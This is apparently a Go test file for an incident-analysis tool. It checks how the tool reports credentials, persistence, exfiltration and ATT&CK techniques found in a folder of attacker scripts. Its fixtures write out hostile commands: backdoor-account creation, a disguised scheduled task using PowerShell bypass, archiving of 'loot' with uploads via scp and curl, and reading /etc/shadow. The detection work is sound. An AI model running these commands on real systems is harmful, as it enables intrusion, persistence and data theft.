package command

import (
	"encoding/base64"
	"fmt"
	"maps"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/get-sybers/slopmop/internal/evidencetest"
)

// intrusion writes a folder of scripts and outputs that sign in, persist,
// collect and send out, and returns it with the token and the encoded key
// document its files hold.
func intrusion(t *testing.T) (folder, token, document string) {
	t.Helper()
	part := func(text string) string { return base64.RawURLEncoding.EncodeToString([]byte(text)) }
	token = part(`{"alg":"RS256","typ":"JWT"}`) + "." +
		part(`{"aud":"https://graph.microsoft.com","iss":"https://sts.windows.net/6f9619ff-8b86-4d11-b42d-00c04fc964ff/","upn":"adm@contoso.onmicrosoft.com","scp":"User.Read Mail.Read","exp":1793527200}`) +
		"." + part("signature")
	document = base64.StdEncoding.EncodeToString([]byte(`{"type": "service_account", "project_id": "acme-prod-4711", "client_email": "deployer@acme-prod-4711.iam.gserviceaccount.com"}`))
	folder = t.TempDir()
	for name, text := range map[string]string{
		"20261101_090000_step01_recon.ps1": "# Step 1 - Check user: verify the account exists and list the domain\n" +
			"whoami /all\n" +
			"Invoke-WebRequest https://www.google.com -UseBasicParsing | Out-Null\n" +
			"Invoke-RestMethod -Uri \"https://graph.microsoft.com/v1.0/users\" -Headers @{Authorization = \"Bearer " + token + "\"}\n",
		"recon_20261101_090030.txt": "User Name      SID\n============== ==============================================\n" +
			"corp\\jdoe      S-1-5-21-1111111111-2222222222-3333333333-1105\n\n===== Access Token =====\n" +
			"Last login: Mon Oct 20 10:00:00 2026 from 10.0.0.5\n",
		"20261101_091000_step02_persist.ps1": "schtasks /create /s dc01.corp.local /u corp\\admin /p Passw0rd!23 /ru SYSTEM /sc onlogon /tn \"WindowsUpdateCheck\" /tr \"powershell -ep bypass -f C:\\Users\\Public\\u.ps1\"\n" +
			"$action = New-ScheduledTaskAction -Execute \"C:\\ProgramData\\svc\\agent.exe\"\n" +
			"Register-ScheduledTask -TaskName \"EdgeUpdateTaskMachine\" -Action $action\n" +
			"net user backdoor P@ssw0rd123 /add\n",
		"20261101_092000_step03_collect.sh": "#!/bin/bash\n# Archive: compress the loot before it leaves\n" +
			"tar czf /tmp/loot.tar.gz /srv/finance\n7z a -pInfected1 /tmp/mail.7z /var/mail\nrar a /tmp/hr.rar /srv/hr\n" +
			"mysqldump crm | gzip > /tmp/crm.sql.gz\n" +
			"sshpass -p 'Winter2026!' scp /tmp/loot.tar.gz root@10.0.0.5:/tmp/\n" +
			"curl -u admin:Hunter2pass -T /tmp/mail.7z https://nexus.corp.local/repository/raw/mail.7z\n" +
			"curl -H \"Authorization: Basic c3ZjX2FwaTpTdXAzclMzY3JldCE=\" https://jenkins.corp.local/api/json\n",
		"keys_20261101_093000.json": `{"name": "projects/acme-prod-4711/serviceAccounts/deployer/keys/1", "privateKeyData": "` + document + `"}`,
	} {
		if err := os.WriteFile(filepath.Join(folder, name), []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return folder, token, document
}

// A credential is listed once, by whose it is and what it is used against
// and then its value; an encoded one is written decoded in the report and as
// it stands in the saved table; and a line of signs or a sentence is none.
func TestReportLinksAndDecodes(t *testing.T) {
	folder, token, document := intrusion(t)
	readout, saved := report(t, folder, "summary", "exposure")
	table := rows(t, filepath.Join(saved, "exposure.csv"))
	const claims = "upn=adm@contoso.onmicrosoft.com; aud=https://graph.microsoft.com; scp=User.Read Mail.Read; exp=2026-11-01T10:00:00Z; iss=https://sts.windows.net/6f9619ff-8b86-4d11-b42d-00c04fc964ff/"
	const key = "type=service_account; project_id=acme-prod-4711; client_email=deployer@acme-prod-4711.iam.gserviceaccount.com"
	for _, want := range []map[string]string{
		{"kind": "password", "value": "Passw0rd!23", "account": "admin", "service": "dc01.corp.local", "seen": "used"},
		{"kind": "password", "value": "P@ssw0rd123", "account": "backdoor"},
		{"kind": "password", "value": "Winter2026!", "account": "root", "service": "10.0.0.5"},
		{"kind": "password", "value": "Hunter2pass", "account": "admin", "service": "nexus.corp.local"},
		{"kind": "password", "value": "Sup3rS3cret!", "account": "svc_api", "service": "jenkins.corp.local"},
		{"kind": "password", "value": token, "decoded": claims, "account": "adm@contoso.onmicrosoft.com", "form": "token", "service": "Microsoft 365"},
		{"kind": "password", "value": document, "decoded": key, "account": "deployer@acme-prod-4711.iam.gserviceaccount.com", "form": "key", "service": "Google Cloud"},
	} {
		find(t, table, want)
	}
	var users []string
	for _, row := range table {
		value, _ := row["value"].(string)
		switch {
		case row["kind"] == "username":
			users = append(users, value)
		case row["kind"] == "password" && row["decoded"] == nil && !strings.ContainsAny(value, "0123456789"):
			t.Errorf("the exposure lists %q as a secret", value)
		}
	}
	slices.Sort(users)
	if want := []string{"adm@contoso.onmicrosoft.com", "admin", "backdoor", "deployer@acme-prod-4711.iam.gserviceaccount.com", "jdoe", "root", "svc_api"}; !slices.Equal(users, want) {
		t.Errorf("usernames = %q, want %q", users, want)
	}
	for _, want := range []string{
		"\n  Passwords and secrets (7)\n",
		"\n  Microsoft 365 (2)\n    [x] " + claims + "  token of adm@contoso.onmicrosoft.com  ",
		"\n  Google Cloud (2)\n    [x] " + key + "  key of deployer@acme-prod-4711.iam.gserviceaccount.com  ",
	} {
		if !strings.Contains(readout, want) {
			t.Errorf("the readout lacks %q:\n%s", want, readout)
		}
	}
	// A secret is a line of what it is, whether it was collected or used, its value and its places.
	for _, cells := range [][]string{
		{"password of admin, dc01.corp.local", "used", "Passw0rd!23", "20261101_091000_step02_persist.ps1:1"},
		{"password of root, 10.0.0.5", "used", "Winter2026!", "20261101_092000_step03_collect.sh:7"},
		{"password of svc_api, jenkins.corp.local", "used", "Sup3rS3cret!", "20261101_092000_step03_collect.sh:9"},
		{"token of adm@contoso.onmicrosoft.com, Microsoft 365", "used", claims, "20261101_090000_step01_recon.ps1:4"},
	} {
		line := `\n    \[x\] `
		for _, cell := range cells {
			line += regexp.QuoteMeta(cell) + ` *`
		}
		if !regexp.MustCompile(line + `\n`).MatchString(readout) {
			t.Errorf("the readout has no line of the cells %q in that order:\n%s", cells, readout)
		}
	}
	for _, gone := range []string{token, document, "====", "  verify  ", "  Mon  "} {
		if strings.Contains(readout, gone) {
			t.Errorf("the readout holds %q", gone)
		}
	}
}

// A task is listed with its name and what it runs, a resource after the
// activity that acted on it, an archive of any archiver by its file, and a
// host of a vendor not at all.
func TestReportTargetsOfActivities(t *testing.T) {
	folder, _, _ := intrusion(t)
	readout, saved := report(t, folder, "targeted")
	for _, want := range []string{
		"\n  Resource (1)\n    [i] GraphDirectoryEnumeration  /users\n",
		"\n  Task (2)\n" +
			"    [x] WindowsUpdateCheck     powershell -ep bypass -f C:\\Users\\Public\\u.ps1  ScheduledTaskCreation\n",
		"    [x] EdgeUpdateTaskMachine  C:\\ProgramData\\svc\\agent.exe                    ScheduledTaskCreation\n",
		"\n  Archive (4)\n    [!] /tmp/loot.tar.gz  ArchiveCreation\n",
		"    [!] /tmp/mail.7z      ArchiveCreation\n",
		"    [!] /tmp/hr.rar       ArchiveCreation\n",
		"    [!] /tmp/crm.sql.gz   ArchiveCreation\n",
		"\n  Hostnames (3)\n    [!] dc01.corp.local     prior  ",
		"    [!] jenkins.corp.local  prior  ",
		"    [!] nexus.corp.local    prior  ",
	} {
		if !strings.Contains(readout, want) {
			t.Errorf("the readout lacks %q:\n%s", want, readout)
		}
	}
	for _, gone := range []string{"\n  Usernames (", "[!] www.google.com", "[!] graph.microsoft.com"} {
		if strings.Contains(readout, gone) {
			t.Errorf("the readout holds %q", gone)
		}
	}
	page := readFile(t, filepath.Join(saved, "report.html"))
	for _, heads := range []string{"<th>task name</th><th>runs</th><th>acted on by</th>", "<th>acted on by</th><th>resource</th>", "<th>value</th><th>acted on by</th>"} {
		if !strings.Contains(page, heads) {
			t.Errorf("report.html has no table whose columns are headed %s", heads)
		}
	}
	for _, row := range rows(t, filepath.Join(saved, "targeted.json")) {
		if value, _ := row["value"].(string); strings.HasSuffix(value, "google.com") || strings.HasSuffix(value, "microsoft.com") {
			t.Errorf("targeted.json lists %s, a host of a vendor", value)
		}
	}
}

// An impact lists every exposed credential, an entry the accounts and
// credentials that the lines and the files behind it hold, and no entry a
// command or a script.
func TestReportConcernsWhatIsExposed(t *testing.T) {
	folder, _, _ := intrusion(t)
	readout, saved := report(t, folder, "impact", "remediation", "mitigation")
	table := rows(t, filepath.Join(saved, "report.json"))
	every := find(t, table, map[string]string{"section": "impact", "item": "Credentials exposed"})
	listed, _ := every["exposed"].(string)
	held := 0
	for _, row := range rows(t, filepath.Join(saved, "exposure.csv")) {
		if row["kind"] != "password" {
			continue
		}
		held++
		shown := row["value"].(string)
		if decoded, _ := row["decoded"].(string); decoded != "" {
			shown = decoded
		}
		if !strings.Contains(listed, ": "+shown) {
			t.Errorf("the impact does not list the credential %q:\n%s", shown, listed)
		}
	}
	if got := len(strings.Split(listed, "\n")); held != 7 || got != held {
		t.Errorf("the impact lists %d credentials of the %d that are exposed, want all 7", got, held)
	}
	for _, tt := range []struct{ section, item, exposed string }{
		{"impact", "Persistence established", "password of backdoor: P@ssw0rd123\npassword of admin, dc01.corp.local: Passw0rd!23"},
		{"remediation", "Remove persistence", "password of backdoor: P@ssw0rd123\npassword of admin, dc01.corp.local: Passw0rd!23"},
		{"mitigation", "M1032 Multi-factor Authentication", "password of backdoor: P@ssw0rd123\npassword of admin, dc01.corp.local: Passw0rd!23"},
	} {
		if row := find(t, table, map[string]string{"section": tt.section, "item": tt.item}); row["exposed"] != tt.exposed {
			t.Errorf("%s %s: exposed = %q, want %q", tt.section, tt.item, row["exposed"], tt.exposed)
		}
	}
	for _, gone := range []string{"schtasks /create", "net user backdoor", "step02_persist.ps1", "tar czf", "\n      targets  ", "\n      what     "} {
		if strings.Contains(readout, gone) {
			t.Errorf("the readout holds %q, which is a command, a script or what one acts on:\n%s", gone, readout)
		}
	}
}

// The Tactics section and the timeline say the same of an intent: a tactic
// lists every file that shows it, script or output, and the intents of those
// files in the order they began, and the block of each lists the tactic.
func TestTacticsAndTimelineAgree(t *testing.T) {
	folder := t.TempDir()
	first := time.Date(2026, 10, 22, 9, 0, 0, 0, time.UTC)
	for i, f := range []struct{ name, text string }{
		{"i203_creds.sh", "#!/bin/bash\ncat /etc/shadow\n"},
		{"i201_scan.sh", "#!/bin/bash\nnmap -sV 10.0.0.0/24 -oN scan.txt\n"},
		{"cmd-i201.stdout.txt", "Nmap scan report for dc01.corp.example (10.0.0.5)\n+ cat /etc/shadow\n"},
		{"i202-move.sh", "#!/bin/bash\ncurl -s https://files.corp.example/x -o /tmp/x\nssh ops@10.0.0.5 id\n"},
		{"i204.sh", "#!/bin/bash\necho done\n"},
		{"notes.sh", "#!/bin/bash\nwhoami\n"},
	} {
		path := filepath.Join(folder, f.name)
		if err := os.WriteFile(path, []byte(f.text), 0o600); err != nil {
			t.Fatal(err)
		}
		// A time of its own for each file, a minute apart: when a file is
		// written says nothing a test can rely on. i203 begins before i201.
		at := first.Add(time.Duration(i) * time.Minute)
		if err := os.Chtimes(path, at, at); err != nil {
			t.Fatal(err)
		}
	}
	readout, saved := report(t, folder, "tactics", "timeline")
	tactics, timeline, _ := strings.Cut(readout, "\nTimeline")
	for _, want := range []string{
		"  [x] CredentialAccess   TA0006, AML.TA0013  cmd-i201.stdout.txt, i203_creds.sh\n      intents  i203, i201\n",
		"  [x] LateralMovement    TA0008, AML.TA0015  i202-move.sh\n      intents  i202\n",
		"  [i] Discovery          TA0007, AML.TA0008  i201_scan.sh, i202-move.sh, i203_creds.sh and 1 more\n      intents  i203, i201, i202\n",
	} {
		if !strings.Contains(tactics, want) {
			t.Errorf("the tactics lack %q:\n%s", want, tactics)
		}
	}
	// What the saved files hold agrees as the readout does: the intents of
	// the files of a tactic are the intents whose row lists the tactic.
	intentOf := map[string]string{}
	for _, row := range rows(t, filepath.Join(saved, "trace.json")) {
		if id, _ := row["intent"].(string); id != "" {
			intentOf[row["name"].(string)] = id
		}
	}
	listed := map[string][]string{}
	for _, row := range rows(t, filepath.Join(saved, "intents.csv")) {
		shown, _ := row["tactics"].(string)
		for _, name := range strings.Split(shown, ", ") {
			if name != "" {
				listed[name] = append(listed[name], row["intent"].(string))
			}
		}
	}
	found := 0
	for _, row := range rows(t, filepath.Join(saved, "findings.json")) {
		if row["finding"] != kindTactic {
			continue
		}
		found++
		name := row["tactic"].(string)
		var of []string
		for _, file := range strings.Split(row["files"].(string), ", ") {
			if id := intentOf[file]; id != "" && !slices.Contains(of, id) {
				of = append(of, id)
			}
		}
		slices.Sort(of)
		want := slices.Clone(listed[name])
		slices.Sort(want)
		if !slices.Equal(of, want) {
			t.Errorf("%s: its files are of the intents %q, and the intents that list it are %q", name, of, want)
		}
		// Each of those intents has the tactic in its block, and no other has.
		for _, block := range strings.Split(timeline, "\n\n") {
			id := strings.Fields(strings.TrimLeft(block[strings.Index(block, "] ")+1:], " "))[0]
			if !strings.HasPrefix(id, "i2") {
				continue
			}
			if has := regexp.MustCompile(`  TA\d{4}  ` + name + `(?:  |\n|$)`).MatchString(block); has != slices.Contains(want, id) {
				t.Errorf("the block of %s lists %s: %t, want %t:\n%s", id, name, has, slices.Contains(want, id), block)
			}
		}
	}
	if found != 4 {
		t.Errorf("findings.json holds %d tactics, want the four the files show", found)
	}
	// Without intents a tactic names none, and still lists the output that alone shows it.
	plain, _ := report(t, evidencetest.Copy(t, "powershell"), "tactics")
	if !strings.Contains(plain, "  [!] Execution         TA0002, AML.TA0005  staged_20250302_093100.cmd\n") || strings.Contains(plain, "\n      intents  ") {
		t.Errorf("the tactics of a folder without intents lack the tactic of an output, or name intents:\n%s", plain)
	}
}

// A command that is a technique by its name shows the technique wherever a
// technique stands: in the block and the row of its intent, and in what the
// impact of its tactic and the mitigations of the technique are said of.
func TestACommandShowsItsTechnique(t *testing.T) {
	folder := t.TempDir()
	if err := os.WriteFile(filepath.Join(folder, "i301_move.sh"), []byte("#!/bin/bash\nssh ops@10.0.0.5 true\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	readout, saved := report(t, folder)
	_, timeline, _ := strings.Cut(readout, "\nTimeline")
	timeline, _, _ = strings.Cut(timeline, "\n\n")
	if !regexp.MustCompile(`\n      T1021\.004  Remote Services: SSH +TA0008  LateralMovement$`).MatchString(timeline) {
		t.Errorf("the block of i301 has no row for the technique of ssh:\n%s", timeline)
	}
	if strings.Contains(timeline, "\n      tools ") || strings.Contains(timeline, noTechnique) {
		t.Errorf("the block lists ssh as a tool, or says no technique was identified:\n%s", timeline)
	}
	intents := readFile(t, filepath.Join(saved, "intents.csv"))
	if !strings.Contains(intents, ",i301,T1021.004,") {
		t.Errorf("intents.csv does not give i301 the technique of ssh:\n%s", intents)
	}
	moved, mitigated := false, 0
	for _, row := range rows(t, filepath.Join(saved, "report.json")) {
		attack, _ := row["attack"].(string)
		switch {
		case row["section"] == sectionImpact && row["item"] == "Movement to other systems":
			moved = attack == "T1021.004"
		case row["section"] == sectionMitigation && strings.Contains(attack, "T1021.004"):
			mitigated++
			if row["files"] != "i301_move.sh" || row["basis"] != nil {
				t.Errorf("the mitigation %v is of the files %v for %v, want of the script and for no activity", row["item"], row["files"], row["basis"])
			}
		}
	}
	if !moved || mitigated == 0 {
		t.Errorf("the impact names the technique of ssh: %t, and %d mitigations address it, want both", moved, mitigated)
	}
}

// An account the scripts collected shows a technique by its shape, at the
// output that holds it first. An account a script brought shows none, nor
// does an output that holds again what an earlier one held.
func TestCollectedAccountsShowDiscovery(t *testing.T) {
	folder := t.TempDir()
	for name, text := range map[string]string{
		"20261101_090000_step01_look.sh":   "#!/bin/bash\nssh ops@10.0.0.5 true\n",
		"20261101_090100_step01_out.txt":   "root:x:0:0:root:/root:/bin/bash\ndeploy:x:1000:1000::/home/deploy:/bin/bash\nuid=1000(deploy) gid=1000(deploy)\nusername: ops\n",
		"20261101_090200_step02_out.txt":   "CORP\\jsmith\nSamAccountName : mhall\nuserPrincipalName: alice@contoso.onmicrosoft.com\nmail: bob@partner.example\nusername: carol\n",
		"20261101_090300_step03_again.txt": "root:x:0:0:root:/root:/bin/bash\nCORP\\jsmith\n",
	} {
		if err := os.WriteFile(filepath.Join(folder, name), []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	readout, saved := report(t, folder, "tactics", "timeline", "findings")
	shown := map[string]string{}
	for _, row := range rows(t, filepath.Join(saved, "findings.json")) {
		if name, _ := row["finding"].(string); strings.HasSuffix(name, "Discovery") {
			lines, _ := row["evidence"].([]any)
			shown[name] = fmt.Sprint(row["attack"], " of ", row["tactic"], " in ", row["files"], ", ", len(lines))
		}
	}
	// A line shows what the shape of its account says: the listing of deploy
	// is one thing and what its own identity says another.
	want := map[string]string{
		"LocalAccountDiscovery":  "T1087.001 of Discovery in 20261101_090100_step01_out.txt, 2",
		"SystemUserDiscovery":    "T1033 of Discovery in 20261101_090100_step01_out.txt, 1",
		"DomainAccountDiscovery": "T1087.002 of Discovery in 20261101_090200_step02_out.txt, 2",
		"CloudAccountDiscovery":  "T1087.004 of Discovery in 20261101_090200_step02_out.txt, 1",
		"EmailAccountDiscovery":  "T1087.003 of Discovery in 20261101_090200_step02_out.txt, 1",
		"AccountDiscovery":       "T1087 of Discovery in 20261101_090200_step02_out.txt, 1",
	}
	if !maps.Equal(shown, want) {
		t.Errorf("the outputs show\n  %v, want\n  %v", shown, want)
	}
	// The outputs stand under the tactic of their techniques, and the techniques in their block.
	tactics, timeline, _ := strings.Cut(readout, "\nTimeline")
	if !regexp.MustCompile(`\n  \[i\] Discovery +TA0007, AML\.TA0008  20261101_090100_step01_out\.txt, 20261101_090200_step02_out\.txt\n`).MatchString(tactics) {
		t.Errorf("the tactics do not list the two outputs, and those alone, under Discovery:\n%s", tactics)
	}
	for _, row := range []string{"T1087.001  Account Discovery: Local Account", "T1033      System Owner/User Discovery", "T1087.004  Account Discovery: Cloud Account", "T1087      Account Discovery "} {
		if !strings.Contains(timeline, "\n      "+row) {
			t.Errorf("the timeline lacks the row %q:\n%s", row, timeline)
		}
	}
}

// A security identifier an output holds first shows what its authority and
// its relative identifier say it is of, and a listing by relative identifier
// what it lists. One a script brought shows nothing, nor does one seen before.
func TestIdentifiersShowDiscovery(t *testing.T) {
	const domain = "S-1-5-21-1111111111-2222222222-3333333333"
	folder := t.TempDir()
	for name, text := range map[string]string{
		"20261101_090000_step01_look.sh": "#!/bin/bash\nssh ops@10.0.0.5 true\necho " + domain + "-519\n",
		"20261101_090100_groups.txt": strings.Join([]string{
			`BUILTIN\Administrators   Alias   S-1-5-32-544   Mandatory group, Enabled by default`,
			`CORP\Domain Admins   Group   ` + domain + `-512   Mandatory group`,
			`CORP\Enterprise Admins   Group   ` + domain + `-519   Mandatory group`,
			`CORP\App Owners   Group   ` + domain + `-1109   Mandatory group`,
			`corp\jdoe   ` + domain + `-1105`,
			`SID : ` + domain + `-1150`,
			`Administrator   ` + domain + `-500`,
			`krbtgt   ` + domain + `-502`,
		}, "\n") + "\n",
		"20261101_090200_rids.txt": strings.Join([]string{
			`user:[svc_sql] rid:[0x451]`,
			`group:[Domain Admins] rid:[0x200]`,
			`1105: CORP\jsmith (SidTypeUser)`,
			`544: BUILTIN\Administrators (SidTypeAlias)`,
			`S-1-5-32-544`,
		}, "\n") + "\n",
	} {
		if err := os.WriteFile(filepath.Join(folder, name), []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	_, saved := report(t, folder, "findings")
	shown := map[string]string{}
	for _, row := range rows(t, filepath.Join(saved, "findings.json")) {
		if name, _ := row["finding"].(string); strings.HasSuffix(name, "Discovery") {
			var lines []string
			evidence, _ := row["evidence"].([]any)
			for _, e := range evidence {
				line, _ := e.(map[string]any)
				lines = append(lines, fmt.Sprint(strings.TrimPrefix(strings.TrimSuffix(fmt.Sprint(line["file"]), ".txt"), "20261101_0"), ":", line["line"]))
			}
			shown[name] = fmt.Sprint(row["attack"], " ", strings.Join(lines, " "))
		}
	}
	// The group a script named is brought, and the group of the machine is
	// found once; the identifier of jdoe says less than its name on that line.
	want := map[string]string{
		"LocalGroupDiscovery":    "T1069.001 90100_groups:1 90200_rids:4",
		"DomainGroupDiscovery":   "T1069.002 90100_groups:2 90100_groups:4 90200_rids:2",
		"DomainAccountDiscovery": "T1087.002 90100_groups:5 90100_groups:8 90200_rids:1 90200_rids:3",
		"AccountDiscovery":       "T1087 90100_groups:6 90100_groups:7",
	}
	if !maps.Equal(shown, want) {
		t.Errorf("the outputs show\n  %v, want\n  %v", shown, want)
	}
}
